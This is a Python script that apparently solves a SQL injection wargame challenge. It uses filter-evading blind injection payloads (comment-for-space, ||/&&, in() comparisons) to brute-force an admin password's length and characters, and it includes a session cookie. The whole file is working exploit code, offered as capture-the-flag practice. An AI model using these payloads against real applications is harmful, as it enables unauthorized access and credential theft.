import requests

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
cookie = {"PHPSESSID" : 'ovbfdu14h0vaeamskdlr10nttu'}

for i in range(1, 100):
    param = {'no': f'0/**/||/**/id/**/in/**/("admin")/**/&&/**/length(pw)<{i}#'}
    res = requests.get(url, params=param, cookies=cookie)    
    if 'Hello admin' in res.text:
        length = i - 1
        print(f"pw\'s length is {length}")
        break

length = 8
password = ''
for len in range(1,length+1):
    for pw in range(ord('0'), ord('z')):
        param = {'no' : f'1/**/||/**/id/**/in/**/("admin")/**/&&/**/mid(pw,{str(len)},1)/**/in/**/("{chr(pw)}")#'}
        res = requests.get(url, params = param, cookies = cookie)
        if 'Hello admin' in res.text:
            print(f'{len} : {chr(pw)}')
            password = password + chr(pw)
            break

print(password.lower())